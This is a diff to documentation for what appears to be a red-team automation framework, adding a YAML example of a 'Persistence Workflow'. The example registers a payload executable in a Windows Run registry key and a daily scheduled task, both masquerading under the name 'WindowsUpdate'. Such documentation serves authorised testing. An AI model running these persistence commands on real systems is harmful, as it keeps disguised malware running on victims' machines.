@@ -130,6 +130,26 @@ actions:
         value: "SYSTEM"
 ```
 
+### With Variables
+
+```yaml
+name: Persistence Workflow
+variables:
+  payload_path: "C:\\Windows\\Temp\\payload.exe"
+  persistence_name: "WindowsUpdate"
+
+actions:
+  - name: registry_persistence
+    type: shell
+    parameters:
+      command: 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "${persistence_name}" /t REG_EXPAND_SZ /f /d "${payload_path}"'
+
+  - name: schtask_persistence
+    type: shell
+    parameters:
+      command: 'schtasks /create /tn "${persistence_name}" /tr "${payload_path}" /sc daily'
+```
+
 ### With Beacon Metadata
 
 ```yaml
